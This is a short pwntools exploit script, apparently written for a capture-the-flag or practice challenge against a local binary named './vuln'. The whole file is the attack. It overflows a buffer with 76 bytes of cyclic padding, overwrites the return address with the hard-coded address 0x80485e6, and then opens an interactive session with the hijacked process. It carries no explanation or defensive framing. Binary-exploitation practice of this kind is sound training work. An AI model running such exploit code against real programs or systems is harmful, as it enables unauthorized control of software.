# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())


io = start()
payload = cyclic(76)
#payload = 'A'*64
payload += p32(0x80485e6)
io.sendline(payload)
io.interactive()

